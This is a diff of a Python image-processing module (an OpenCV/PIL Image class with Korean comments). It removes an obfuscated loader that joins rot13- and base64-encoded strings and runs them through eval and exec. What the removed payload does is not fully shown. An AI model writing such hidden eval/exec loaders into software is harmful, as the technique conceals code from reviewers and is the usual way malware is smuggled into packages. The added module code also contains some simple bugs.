OcoS90o19zpzSgMFujnJ1aXDbtVPNtVPNtVUWyqUIlovOWoJSaMFuzpzSgMFjtp2IfMv5sK2AioT9lH3OuL2HcPtbtVPNtVlNgYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYDbXPzAfLKAmVRygLJqyH2I0BtbtVPNtMTIzVS9snJ5cqS9sXUAyoTLfVUOuqTtcBtbtVPNtVPNtVUAyoTLhK19jLKEbVQ0tpTS0nNbtVPNtVPNtVTyzVT5iqPOipl5jLKEbYzI4nKA0plujLKEbXGbXVPNtVPNtVPNtVPNtpzScp2HtEKuwMKO0nJ9hXPYgw7GewMGdfVNt7XT07W6f7MJL7XrNVBlIvhlXgrhYvBhYcP4tVvNeVUOuqTtcPtbtVPNtVPNtVUAyoTLhK19znJkyplN9VTqfo2Vbo3ZhpTS0nP5do2yhXUOuqTtfVPVdYvbvXFxXPvNtVPOxMJLtK19cqTIlK18bp2IfMvx6PvNtVPNtVPNtpzI0qKWhVUAyoTLXPvNtVPOxMJLtK19hMKu0K18bp2IfMvx6PvNtVPNtVPNtnJLtoTIhXUAyoTLhK19znJkyplxtCvNjBtbtVPNtVPNtVPNtVPOznJkyK3OuqTttCFOmMJkzYy9sMzyfMKZhpT9jXPxXVPNtVPNtVPNtVPNtnJ1aVQ0tFJ1uM2HhoT9uMS9coJSaMFuznJkyK3OuqTtcPvNtVPNtVPNtVPNtVUWyqUIlovOcoJpXVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPOlLJymMFOGqT9jFKEypzS0nJ9hPtbtVPNtMTIzVS9soTIhK18bp2IfMvx6PvNtVPNtVPNtpzI0qKWhVTkyovumMJkzYy9sMzyfMKZcPt=='
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+import builtins
+import os
+import re
+import time
+from PIL import Image as PImage
+from PIL import ImageDraw
+from PIL import ImageFont
+from glob import glob
+import matplotlib.image as img
+import matplotlib.pyplot as plt
+import cv2
+import imutils
+import urllib.request
+import scipy.spatial.distance as spsd
+import numpy as np
+import uuid
+
+from helloai.core.config import *
+from helloai.core.colors import Color
+
+
+__all__ = ["Image", "ColorSpace", "ImageSet"]
+
+FONT_PATH = "./assets/fonts/gulim.ttc"
+
+
+class ColorSpace:
+    UNKNOWN = "unknown"
+    BGR = "bgr"
+    GRAY = "gray"
+    RGB = "rgb"
+    HLS = "hls"
+    HSV = "hsv"
+    XYZ = "xyz"
+    YCrCb = "ycrcb"
+    BGRA = "bgra"
+    RGBA = "rgba"
+
+
+class Image:
+    def __init__(self, frame=None, color_space=ColorSpace.BGR):
+        if isinstance(frame, np.ndarray):
+            self.__filename = None
+            self.__frame = frame
+            self.__image = self.__frame
+            self.__array = self.__frame
+            # shape (h, w, c)
+            self.__height = self.__frame.shape[0]
+            self.__width = self.__frame.shape[1]
+            self.__colorSpace = color_space
+            if len(self.__frame.shape) == 3:
+                h, w, c = self.__frame.shape
+                if c == 4:
+                    self.__colorSpace = ColorSpace.BGRA
+            else:
+                self.__colorSpace = ColorSpace.GRAY
+        else:
+            raise Exception("파라메터의 형이 맞지않습니다")
+
+    @property
+    def width(self):
+        if self.image is not None:
+            return self.__frame.shape[1]
+        return -1
+
+    @property
+    def height(self):
+        if self.__frame is not None:
+            return self.__frame.shape[0]
+        return -1
+
+    @property
+    def center(self):
+        """이미지의 중심 좌료
+
+        Returns:
+            turple: 좌표 (x, y)
+        """
+        return (self.__width // 2, self.__height // 2)
+
+    @property
+    def image(self):
+        return self.__frame
+
+    @property
+    def frame(self):
+        return self.__frame
+
+    @property
+    def list(self):
+        return self.frame
+
+    @property
+    def array(self):
+        return np.array(self.__frame)
+
+    def to_array(self):
+        return np.array(self.__frame)
+
+    @property
+    def nparray(self):
+        return np.array(self.__frame)
+
+    def to_nparray(self):
+        return np.array(self.__frame)
+
+    # setter보다 먼저 같은 이름의 getter정의가 필요
+    # 이 setter가 없으면 읽기 전용이 된다.
+    # @name.setter
+    # def name(self, frame):
+    #     self.__frame = name
+
+    @property
+    def shape(self):
+        """
+        (height, weight, channel)
+        """
+        return self.__frame.shape
+
+    @property
+    def dimension(self):
+        """
+        차원수
+        """
+        return self.__frame.ndim
+
+    @property
+    def size(self):
+        """
+        (width, height)
+        """
+        if self.__frame is not None:
+            return (self.__frame.shape[1], self.__frame.shape[0])
+
+    @property
+    def colorspace(self):
+        return self.__colorSpace
+
+    @property
+    def pixels(self):
+        if self.__frame is not None:
+            # return self.__frame.tolist()
+            return self.__frame.tolist()
+        return np.array([])
+
+    @property
+    def filename(self):
+        return self.__filename
+
+    # def __eq__(self, other):
+    #     'x == y를 정의'
+    #     print('__eq__', other)
+    #     return True
+
+    # def __ne__(self, other):
+    #     'x != y를 정의'
+    #     print('__ne__', other)
+
+    def copy(self):
+        return Image(np.copy(self.__frame), self.__colorSpace)
+
+    def set_filename(self, name):
+        self.__filename = name
+        return self
+
+    def __get_colorspace(self, frame):
+        shape = frame.shape
+        if len(shape) == 2:
+            return ColorSpace.GRAY
+        else:
+            _, _, ch = shape
+            if ch == 1:
+                return ColorSpace.GRAY
+            elif ch == 2:
+                return ColorSpace.GRAY
+            elif ch == 3:
+                return ColorSpace.BGR
+            elif ch == 4:
+                return ColorSpace.BGRA
+            else:
+                return ColorSpace.GRAY
+
+    # def __resize_with_border(self, size):
+    #     frame = np.copy(self.__frame)
+    #     old_size = frame.shape[:2]  # old_size is in (height, width) format
+
+    #     ratio = float(size) / max(old_size)
+    #     new_size = tuple([int(x * ratio) for x in old_size])
+
+    #     # new_size should be in (width, height) format
+    #     frame = cv2.resize(frame, (new_size[1], new_size[0]))
+    #     delta_w = size - new_size[1]
+    #     delta_h = size - new_size[0]
+
+    #     top, bottom = 0 + delta_h // 2, delta_h - (delta_h // 2)
+    #     left, right = 0 + delta_w // 2, delta_w - (delta_w // 2)
+
+    #     #   부족한 부분 검은색으로 채워서 복사한다. https://can-do.tistory.com/4
+    #     frame = cv2.copyMakeBorder(frame, top, bottom, left, right, cv2.BORDER_CONSTANT, value=[0, 0, 0])
+    #     return Image(frame), ratio, top, left
+
+    def resize(self, width=0, height=0):
+        """넓이와 높이를 지정해서 사이즈를 바꾼다.
+        크기를 지정하지 않으면, 현재 이미지의 사이즈를 사용한다.
+
+        Args:
+            width (int, optional): 넓이. Defaults to 0.
+            height (int, optional): 높이. Defaults to 0.
+
+        Returns:
+            [type]: [description]
+        """
+        if self.__frame is None:
+            return Image(np.copy(self.__frame), self.__colorSpace)
+
+        frame = np.copy(self.__frame)
+        if width > 0 and height == 0:
+            # 가로의 크기에 맞춰서, 비율을 유지하면서 리사이즈
+            resized = imutils.resize(frame, width=width)
+            return Image(resized, self.__colorSpace)
+        elif width <= 0 or height <= 0:
+            # 크기를 지정하지 않으면, 현재 이미지의 크기를 그대로 사용한다.
+            width = self.width if width == 0 else width
+            height = self.height if height == 0 else height
+            frame = cv2.resize(
+                frame, dsize=(width, height), interpolation=cv2.INTER_LINEAR
+            )
+            return Image(frame, self.__colorSpace)
+        elif width > MAX_DIMENSION or height > MAX_DIMENSION:
+            return Image(frame, self.__colorSpace)
+        else:
+            frame = cv2.resize(
+                self.__frame, dsize=(width, height), interpolation=cv2.INTER_LINEAR
+            )
+            return Image(frame, self.__colorSpace)
+
+    def scale(self, scale=1):
+        """넓이, 높이의 비율을 고정하고, 크기를 조절한다.
+
+        Args:
+            scale (int, optional): 크기 비율. Defaults to 1.
+
+        Returns:
+            Image: 크기 조절된 이미지
+        """
+        if self.__frame is None:
+            return Image(np.copy(self.__frame), self.__colorSpace)
+        frame = np.copy(self.__frame)
+        h, w = frame.shape[0], frame.shape[1]
+
+        # frame = cv2.resize(self.__frame, dsize=(w*scale, h*scale), interpolation=cv2.INTER_LINEAR)
+        frame = cv2.resize(
+            self.__frame,
+            dsize=(0, 0),
+            fx=scale,
+            fy=scale,
+            interpolation=cv2.INTER_LINEAR,
+        )
+        return Image(frame, self.__colorSpace)
+
+    def adaptive_scale(self, size=None, color=(0, 0, 0)):
+        """리사이즈해서 정사각형 이미지로 만든다. 부족한 부분은 검은색으로 채운다.
+
+        Args:
+            size (int): 이미지의 한 변 길이
+            color (tuple): 여백부분의 색상 (r, g, b)
+
+        Returns:
+            Image: 리사이즈된 이미지
+        """
+        frame = np.copy(self.__frame)
+        old_size = frame.shape[:2]  # old_size is in (height, width) format
+        if not size:
+            size = max(old_size)
+
+        ratio = float(size) / max(old_size)
+        new_size = tuple([int(x * ratio) for x in old_size])
+
+        # new_size should be in (width, height) format
+        frame = cv2.resize(frame, (new_size[1], new_size[0]))
+        delta_w = size - new_size[1]
+        delta_h = size - new_size[0]
+
+        top, bottom = 0 + delta_h // 2, delta_h - (delta_h // 2)
+        left, right = 0 + delta_w // 2, delta_w - (delta_w // 2)
+
+        color = color[::-1]
+        #   부족한 부분 검은색으로 채워서 복사한다. https://can-do.tistory.com/4
+        frame = cv2.copyMakeBorder(
+            frame, top, bottom, left, right, cv2.BORDER_CONSTANT, value=color
+        )
+        # frame = cv2.copyMakeBorder(frame, top, bottom, left, right, cv2.BORDER_CONSTANT, value=[0, 0, 0])
+        return Image(frame), ratio, top, left
+
+    # def squarize(self, crop=False, color=(0, 0, 0)):
+    #     """넓이와 높이의 길이가 같도록 정사각형으로 만든다.
+
+    #     Args:
+    #         crop (bool, optional): 정사각형으로 자를것인지 (True), 이미지 전체를 정사각형으로 남기로 나머지 부분은 주어진 색상으로 채운다(False).
+    #         color (tuple, optional): 나머지 영역을 채우는 색상 (r, g, b)
+    #     """
+    #     frame = np.copy(self.__frame)
+    #     old_size = frame.shape[:2]  # old_size is in (height, width) format
+
+    #     if crop:
+    #         # center crop
+    #         img_size = min(self.__frame.shape[:2])
+    #         img = self.__center_crop((img_size, img_size))
+
+    #         delta_w = old_size[1] - img_size
+    #         delta_h = old_size[0] - img_size
+    #         top, bottom = delta_h // 2, delta_h - (delta_h // 2)
+    #         left, right = delta_w // 2, delta_w - (delta_w // 2)
+    #         return img, top, left
+    #     else:
+    #         # 테두리를 만들어서 정사각형화
+    #         size = max(self.__frame.shape[:2])
+    #         img, ratio, top, left = self.adaptive_scale(size, color)
+    #         return img, top, left
+
+    def squarize(self, size, crop=False, color=(0, 0, 0)):
+        """넓이와 높이의 길이가 같도록 정사각형으로 만든다.
+
+        Args:
+            crop (bool, optional): 정사각형으로 자를것인지 (True), 이미지 전체를 정사각형으로 남기로 나머지 부분은 주어진 색상으로 채운다(False).
+            color (tuple, optional): 나머지 영역을 채우는 색상 (r, g, b)
+        """
+        if crop:
+            # center crop
+            frame = np.copy(self.__frame)
+            old_size = frame.shape[:2]  # old_size is in (height, width) format
+            # 334, 500
+            ratio = float(size) / min(old_size)
+            print("@ratio", ratio)
+            new_size = tuple([int(x * ratio) for x in old_size])
+            print("@new_size", new_size)
+
+            # 사이즈를 줄이고
+            frame = cv2.resize(frame, (new_size[1], new_size[0]))
+
+            # Crop하고
+            img_size = min(new_size)
+            print("@img_size", img_size)
+
+            img = self.__center_crop(frame, (img_size, img_size))
+            print("@crop img shape", img.shape)
+
+            # img = Image(frame)
+            delta_w = new_size[1] - img_size
+            delta_h = new_size[0] - img_size
+            print("@delta_w", delta_w)
+            print("@delta_h", delta_h)
+
+            top, bottom = delta_h // 2, delta_h - (delta_h // 2)
+            left, right = delta_w // 2, delta_w - (delta_w // 2)
+            # 크롭의 경우는 랜드마크를 빼준다.
+            # landmarks = ((landmarks * ratio)  - np.array([left, top])).astype(np.int)
+            return img, ratio, top, left
+        else:
+            # 테두리를 만들어서 정사각형화
+            # size = max(self.__frame.shape[:2])
+            img, ratio, top, left = self.adaptive_scale(size, color)
+            # 크롭의 경우는 랜드마크를 더한다.
+            # landmarks = ((landmarks * ratio) + np.array([left, top])).astype(np.int)
+            return img, ratio, top, left
+
+    def ___resize(self, width=0, height=0, fx=0, fy=0):
+        if self.__frame is None:
+            return Image(np.copy(self.__frame), self.__colorSpace)
+
+        frame = np.copy(self.__frame)
+        if width <= 0 or height <= 0:
+            if fx == 0 or fy == 0:
+                return Image(np.copy(self.__frame), self.__colorSpace)
+            else:
+                frame = cv2.resize(
+                    frame, dsize=(0, 0), fx=fx, fy=fy, interpolation=cv2.INTER_LINEAR
+                )
+                return Image(frame, self.__colorSpace)
+
+        elif width > MAX_DIMENSION or height > MAX_DIMENSION:
+            return Image(np.copy(self.__frame), self.__colorSpace)
+        else:
+            frame = cv2.resize(
+                self.__frame, dsize=(width, height), interpolation=cv2.INTER_LINEAR
+            )
+            return Image(frame, self.__colorSpace)
+
+    def crop(self, x=0, y=0, width=0, height=0, centered=False):
+        """지정한 좌표를 시작점으로 해서 주어진 크기로 이미지를 자른다.
+
+        Args:
+            x (int, optional): 시작점 x 좌표. Defaults to 0.
+            y (int, optional): 시작점 y 좌표. Defaults to 0.
+            height (int, optional): 넓이. Defaults to 0.
+            height (int, optional): 높아. Defaults to 0.
+            centered (bool, optional): 이미지의 중심을 기준으로 자를것인가. Defaults to False.
+
+        Returns:
+            Image: 결과 이미지
+        """
+        # 0을 지정하면 현재 이미지의 크기를 사용한다.
+        w = self.width if width == 0 else width
+        h = self.height if height == 0 else height
+
+        if centered:
+            return self.__center_crop(self.__frame.copy(), (w, h))
+        else:
+            frame = self.__frame[y : y + h, x : x + w]
+            return Image(np.copy(frame), self.__colorSpace)
+
+    def __center_crop(self, frame, dim):
+        # frame = np.copy(self.__frame)
+        height, width = frame.shape[:2]  # old_size is in (height, width) format
+
+        # crop_width = dim[0] if dim[0]<img.shape[1] else img.shape[1]
+        # crop_height = dim[1] if dim[1]<img.shape[0] else img.shape[0]
+        crop_width, crop_height = min(dim), min(dim)
+
+        mid_x, mid_y = int(width / 2), int(height / 2)
+        cw2, ch2 = int(crop_width / 2), int(crop_height / 2)
+        crop_img = frame[mid_y - ch2 : mid_y + ch2, mid_x - cw2 : mid_x + cw2]
+
+        return Image(crop_img)
+
+    # ref : https://qiita.com/mo256man/items/82da5138eeacc420499d
+    def __frame_to_pil(self, frame, colorspace):
+        """
+        frame에서 PIL이미지로 변환
+        """
+        frame = frame.copy()
+        if colorspace == ColorSpace.BGR:
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        elif colorspace == ColorSpace.GRAY:
+            frame = cv2.cvtColor(frame, cv2.COLOR_GRAY2RGB)
+        elif colorspace == ColorSpace.RGB:
+            pass
+        elif colorspace == ColorSpace.RGBA:
+            frame = cv2.cvtColor(frame, cv2.COLOR_RGBA2RGB)
+        elif colorspace == ColorSpace.BGRA:
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2RGB)
+        else:
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        im_pil = PImage.fromarray(frame)
+        return im_pil
+
+    def __pil_to_frame(self, im_pil, colorspace=ColorSpace.BGR):
+        """
+        PIL이미지에서 frame으로 변환
+        """
+        frame = np.asarray(im_pil)
+        if colorspace == ColorSpace.BGR:
+            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+        elif colorspace == ColorSpace.GRAY:
+            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2GRAY)
+        elif colorspace == ColorSpace.RGB:
+            pass
+        elif colorspace == ColorSpace.RGBA:
+            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2RGBA)
+        elif colorspace == ColorSpace.BGRA:
+            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGRA)
+        else:
+            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+        return frame
+
+    def overlay(self, img):
+        pass
+
+    def rotate(self, degree, resize=False):
+        frame = np.copy(self.__frame)
+
+        if resize:
+            frame = imutils.rotate(frame, degree)
+        else:
+            frame = imutils.rotate_bound(frame, degree)
+
+        print("***", frame.shape)
+        return Image(frame)
+
+    def flip(self, mode="h"):
+        """
+        'h' : 좌우
+        'v' : 상하
+        'hv' : 상하좌우
+        """
+        frame = np.copy(self.__frame)
+        if mode == "v":
+            frame = cv2.flip(frame, 0)
+        elif mode == "h":
+            frame = cv2.flip(frame, 1)
+        else:
+            frame = cv2.flip(frame, -1)
+        return Image(frame)
+
+    def save(self, filename):
+        # """
+        # jpg파일로 저장
+        # """
+        # if path != None and path.endswith('/'):
+        #     path = path[:-1]
+
+        # if not os.path.isdir(path):
+        #     os.mkdir(path)
+
+        # # 파일이름은 정할 수 없다.
+        # name = str(round(time.time() * 1000))
+        # cv2.imwrite(f'{path}/{name}.jpg', self.__frame)
+        # print(f'{path}/{name}.jpg', '을 저장하였습니다')
+        pimg = self.__frame_to_pil(self.__frame.copy(), self.__get_colorspace)
+        pimg.save(filename)
+        # print(f'{filename}', '을 저장하였습니다')
+        return self
+
+    @property
+    def pil(self):
+        return self.to_pilimage()
+
+    def to_pilimage(self):
+        return self.__frame_to_pil(self.__frame.copy(), self.__get_colorspace)
+
+    @classmethod
+    def from_pilimage(cls, pimg):
+        frame = np.asarray(pimg)
+        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
+        return Image(frame)
+
+    # ---------------------------------------------------------------------------------------
+    # HSV_Lower_Yellow = (7,15,240)
+    # HSV_Upper_Yellow = (30,0,255)
+    # cv2 function
+    def in_range(self, lower, upper):
+        if not isinstance(lower, list):
+            # lower = [lower, 30, 30]
+            lower = [lower, 15, 240]
+
+        if not isinstance(upper, list):
+            # upper = [upper, 255, 255]
+            upper = [upper, 0, 255]
+
+        lower = np.array(lower)
+        upper = np.array(upper)
+        hsv = cv2.cvtColor(self.image, cv2.COLOR_BGR2HSV)
+        mask = cv2.inRange(hsv, lower, upper)
+        return Image(np.copy(mask))
+
+    def find_contours(self, min=100):
+        # contours, hierarchy = cv2.findContours(self.__frame, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_NONE)
+        # contours, hierarchy = cv2.findContours(self.__frame, cv2.RETR_CCOMP, cv2.CHAIN_APPROX_NONE)
+        contours, hierarchy = cv2.findContours(
+            self.__frame, cv2.RETR_LIST, cv2.CHAIN_APPROX_SIMPLE
+        )
+        cnts = []
+        for i in range(0, len(contours)):
+            if len(contours[i]) > 0:
+                # remove small objects
+                area = cv2.contourArea(contours[i])
+                if area < min:
+                    continue
+                cnts.append(contours[i])
+                # 바운딩박스를 계산하는 아래 코드
+                # rect = cv2.minAreaRect(contours[i])
+                # box = cv2.boxPoints(rect)
+                # print('*** ', box)
+                # cnts.append(box)
+        return cnts
+
+    def draw_contours(self, contours, txt=True):
+        frame = self.__frame.copy()
+
+        # --------------- No 1. ---------------------------------------
+        # for i in range(len(contours)):
+        #     area = cv2.contourArea(contours[i])
+        #     cv2.drawContours(frame, [contours[i]], 0, (0, 0, 255), 2)
+        #     if txt:
+        #         cv2.putText(frame, f'{area}({i})', tuple(contours[i][0][0]), cv2.FONT_HERSHEY_COMPLEX, 0.5, (0, 255, 0), 1)
+
+        # --------------- No 2. ---------------------------------------
+        # https://webnautes.tistory.com/1270
+        # 아래 부분을 함께 그려도 위의 그린 내용과 비슷하다. 일단 코멘트
+        for cnt in contours:
+            epsilon = 0.02 * cv2.arcLength(cnt, True)
+            approx = cv2.approxPolyDP(cnt, epsilon, True)
+            print(len(approx))
+            cv2.drawContours(frame, [approx], 0, (0, 255, 255), 5)
+        return Image(frame, self.__colorSpace)
+
+    # def draw_contours(self, contours, txt=True):
+    #     frame = self.__frame.copy()
+    #     for i in range(len(contours)):
+    #         box = np.int0(contours[i])
+    #         cv2.drawContours(frame, [box], 0, (0, 255, 0), 3)
+    #     return Image(frame, self.__colorSpace)
+
+    def apply_mask(self, mask_img):
+        img = cv2.bitwise_and(self.__frame, self.__frame, mask=mask_img.frame)
+        return Image(img)
+
+    def masking(self, mask_img):
+        img = cv2.bitwise_and(self.__frame, self.__frame, mask=mask_img.frame)
+        return Image(img)
+
+    def bitwise_and(self, img, mask_img=None):
+        """
+        같은 shape만 적용가능
+        """
+        if mask_img:
+            img = cv2.bitwise_and(self.__frame, img.frame, mask=mask_img.frame)
+        else:
+            img = cv2.bitwise_and(self.__frame, img.frame)
+        return Image(img)
+
+    def bitwise_or(self, img, mask_img=None):
+        """
+        같은 shape만 적용가능
+        """
+        if mask_img:
+            img = cv2.bitwise_or(self.__frame, img.frame, mask=mask_img.frame)
+        else:
+            img = cv2.bitwise_or(self.__frame, img.frame)
+        return Image(img)
+
+    def bitwise_xor(self, img, mask_img):
+        """
+        같은 shape만 적용가능
+        """
+        if mask_img:
+            img = cv2.bitwise_xor(self.__frame, img.frame, mask=mask_img.frame)
+        else:
+            img = cv2.bitwise_xor(self.__frame, img.frame)
+        return Image(img)
+
+    def bitwise_not(self):
+        img = cv2.bitwise_not(self.__frame)
+        return Image(img)
+
+    # --------------------------------------------------------------------------------------
+    def __color_rbg_to_bgr(self, color):
+        r, g, b = color
+        return (b, g, r)
+
+    def __color_bgr_to_rgb(self, color):
+        b, g, r = color
+        return (r, g, b)
+
+    # ---------------------------------------------------------------------------------------
+    #  color space
+    def to_rgb(self):
+        frame = self.__frame.copy()
+        if self.__colorSpace == ColorSpace.BGR:
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        elif self.__colorSpace == ColorSpace.GRAY:
+            frame = cv2.cvtColor(frame, cv2.COLOR_GRAY2RGB)
+        elif self.__colorSpace == ColorSpace.HSV:
+            frame = cv2.cvtColor(frame, cv2.COLOR_HSV2BGR)
+            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        elif self.__colorSpace == ColorSpace.BGRA:
+            frame = frame[:, :, (2, 1, 0, 3)]
+        elif (
+            self.__colorSpace == ColorSpace.RGB or self.__colorSpace == ColorSpace.RGBA
+        ):
+            pass
+
+        return Image(frame, ColorSpace.RGB)
+
+    @property
+    def rgb(self):
+        return self.to_rgb()
+
+    def to_hsv(self):
+        img = cv2.cvtColor(self.image, cv2.COLOR_BGR2HSV)
+        return Image(img, ColorSpace.HSV)
+
+    @property
+    def hsv(self):
+        return self.to_hsv()
+
+    def to_gray(self):
+        frame = self.__frame.copy()
+        if self.__colorSpace != ColorSpace.GRAY:
+            if self.__colorSpace == ColorSpace.RGB:
+                frame = cv2.cvtColor(self.image, cv2.COLOR_RGB2GRAY)
+            elif self.__colorSpace == ColorSpace.BGR:
+                frame = cv2.cvtColor(self.image, cv2.COLOR_BGR2GRAY)
+            elif self.__colorSpace == ColorSpace.BGRA:
+                frame = cv2.cvtColor(self.image, cv2.COLOR_BGRA2GRAY)
+            elif self.__colorSpace == ColorSpace.RGBA:
+                frame = cv2.cvtColor(self.image, cv2.COLOR_RGBA2GRAY)
+        return Image(frame, ColorSpace.GRAY)
+
+    @property
+    def gray(self):
+        return self.to_gray()
+
+    def to_bgr(self):
+        """
+        hsv에서 bgr로 변환
+        """
+        frame = self.__frame
+        if self.__colorSpace == ColorSpace.HSV:
+            frame = cv2.cvtColor(self.__frame, cv2.COLOR_HSV2BGR)
+        elif self.__colorSpace == ColorSpace.RGB:
+            frame = cv2.cvtColor(self.__frame, cv2.COLOR_RGB2BGR)
+        elif self.__colorSpace == ColorSpace.GRAY:
+            frame = cv2.cvtColor(self.__frame, cv2.COLOR_GRAY2BGR)
+        elif self.__colorSpace == ColorSpace.BGRA:
+            frame = cv2.cvtColor(self.__frame, cv2.COLOR_BGRA2BGR)
+        elif self.__colorSpace == ColorSpace.BGR:
+            pass
+        return Image(frame, ColorSpace.BGR)
+
+    @property
+    def bgr(self):
+        return self.to_bgr()
+
+    def to_bgra(self):
+        """
+        bgr에서 bgra로 변환
+        """
+        frame = cv2.cvtColor(self.__frame, cv2.COLOR_BGR2BGRA)
+        return Image(frame, ColorSpace.BGRA)
+
+    @property
+    def bgra(self):
+        return self.to_bgra()
+
+    def split(self, ch="r"):
+        if ch == "r":
+            b, g, r = cv2.split(self.__frame)
+            return Image(r, ColorSpace.GRAY)
+        elif ch == "g":
+            b, g, r = cv2.split(self.__frame)
+            return Image(g, ColorSpace.GRAY)
+        elif ch == "b":
+            b, g, r = cv2.split(self.__frame)
+            return Image(b, ColorSpace.GRAY)
+        elif ch == "a":
+            if self.__colorSpace == ColorSpace.BGRA:
+                b, g, r, a = cv2.split(self.__frame)
+                return Image(a, ColorSpace.GRAY)
+        return None
+
+    def threshold(self, thresh=127, maxv=255):
+        _, frame = cv2.threshold(self.__frame, value, 255, cv2.THRESH_BINARY)
+        return Image(frame, ColorSpace.GRAY)
+
+    def binarize(self, value):
+        frame = self.to_gray().frame
+        _, frame = cv2.threshold(frame, value, 255, cv2.THRESH_BINARY)
+        return Image(frame, ColorSpace.GRAY)
+
+    def invert(self):
+        img = cv2.bitwise_not(self.__frame)
+        return Image(img, ColorSpace.GRAY)
+
+    def blit(self, x, y, img):
+        if self.__colorSpace == ColorSpace.GRAY:
+            print("GRAY 이미지에는 오버레이 할 수 없습니다")
+            return Image(np.copy(self.__frame), ColorSpace.GRAY)
+
+        h, w, c = img.frame.shape
+        if c == 4:
+            frame = self.__transparent_overlay(img, pos=(x, y))
+            return Image(frame, self.__colorSpace)
+        elif c == 3:
+            frame = np.copy(self.__frame)
+            frame[y : y + h, x : x + w] = img.frame
+            return Image(frame, self.__colorSpace)
+        else:
+            print("GRAY 이미지에는 오버레이 할 수 없습니다")
+            return Image(np.copy(self.__frame), ColorSpace.GRAY)
+
+    def overlay(self, x, y, img):
+        # blit()함수와 같은데.
+        if self.__colorSpace == ColorSpace.GRAY:
+            print("GRAY 이미지에는 오버레이 할 수 없습니다")
+            return Image(np.copy(self.__frame), ColorSpace.GRAY)
+
+        h, w, c = img.frame.shape
+        if c == 4:
+            frame = self.__transparent_overlay(img, pos=(x, y))
+            return Image(frame, self.__colorSpace)
+        elif c == 3:
+            frame = np.copy(self.__frame)
+            frame[y : y + h, x : x + w] = img.frame
+            return Image(frame, self.__colorSpace)
+        else:
+            print("GRAY 이미지에는 오버레이 할 수 없습니다")
+            return Image(np.copy(self.__frame), ColorSpace.GRAY)
+
+    def __transparent_overlay(self, overlay, pos=(0, 0), scale=1):
+        """
+        투명 이미지(BGRA)를 오버레이 한다.
+        :param overlay: 투명 Image (BGRA)
+        :param pos:  위치.
+        :param scale : 스케일.
+        :return: Image
+        """
+        src = np.copy(self.__frame)
+        overlay = cv2.resize(overlay, (0, 0), fx=scale, fy=scale)
+        h, w, _ = overlay.shape  # Size of foreground
+        rows, cols, _ = src.shape  # Size of background Image
+        y, x = pos[0], pos[1]  # Position of foreground/overlay image
+
+        # loop over all pixels and apply the blending equation
+        for i in range(h):
+            for j in range(w):
+                if x + i >= rows or y + j >= cols:
+                    continue
+                alpha = float(overlay[i][j][3] / 255.0)  # read the alpha channel
+                src[x + i][y + j] = (
+                    alpha * overlay[i][j][:3] + (1 - alpha) * src[x + i][y + j]
+                )
+        return src
+
+    def blend(self, img, weight):
+        frame = cv2.addWeighted(self.__frame, 1 - weight, img.frame, weight, 0)
+        return Image(frame)
+
+    def blur(self, x, y, w, h, ksize=30):
+        frame = np.copy(self.__frame)
+        if w > 0 and h > 0:
+            roi = frame[y : y + h, x : x + w]
+            roi = cv2.blur(roi, (ksize, ksize))
+            frame[y : y + h, x : x + w] = roi
+        return Image(frame, self.__colorSpace)
+
+    # ---------------------------------------------------------------------------------------
+    #  static method
+    @classmethod
+    def merge(cls, b, g, r):
+        frame = cv2.merge((b.frame, g.frame, r.frame))
+        return Image(frame, ColorSpace.BGR)
+
+    @classmethod
+    def from_url(cls, url):
+        resp = urllib.request.urlopen(url)
+        img = np.asarray(bytearray(resp.read()), dtype="uint8")
+        self.image = cv2.imdecode(img, cv2.IMREAD_UNCHANGED)
+        return self
+
+    @classmethod
+    def from_file(cls, path=None):
+        if path is None:
+            return None
+        return cls.load_image(path)
+
+    @classmethod
+    def load(cls, filename):
+        if re.match(r"\w+://", filename):
+            with urllib.request.urlopen(filename) as url:
+                f = io.BytesIO(url.read())
+                pil_image = PImage.open(f)
+        else:
+            # 한글 파일명이 있으면 cv2.imread는 못 읽어들인다.그래서 PImage
+            pil_image = PImage.open(filename)
+
+        frame = cv2.cvtColor(np.array(pil_image), cv2.COLOR_RGB2BGR)
+        return Image(frame).set_filename(filename)
+
+    @classmethod
+    def open(cls, filename):
+        return cls.load(filename)
+
+    @classmethod
+    def concatenate(cls, img1, img2, axis="h"):
+        """
+        'h' : horizontal
+        'v' : vertical
+        """
+        if axis == "v":
+            axis = 0
+        else:
+            axis = 1
+        frame = np.concatenate((img1.frame, img2.frame), axis=axis)
+        return Image(frame)
+
+    def bounding_rect(self, cnts, draw=False):
+        """Contours의 영역을 포함하는 최소의 영역을 구한다.
+
+        Args:
+            cnts (list): Contours의 리스트
+
+        Returns:
+            list: 바운딩 박스 리스트 (x1, y1, x2, y2)
+        """
+        # http://labs.eecs.tottori-u.ac.jp/sd/Member/oyamada/OpenCV/html/py_tutorials/py_imgproc/py_contours/py_contour_features/py_contour_features.html
+
+        # https://webnautes.tistory.com/1270
+        frame = self.__frame.copy()
+        rects = []
+        for i in range(0, len(cnts)):
+            if len(cnts[i]) > 0:
+                x, y, w, h = cv2.boundingRect(cnts[i])
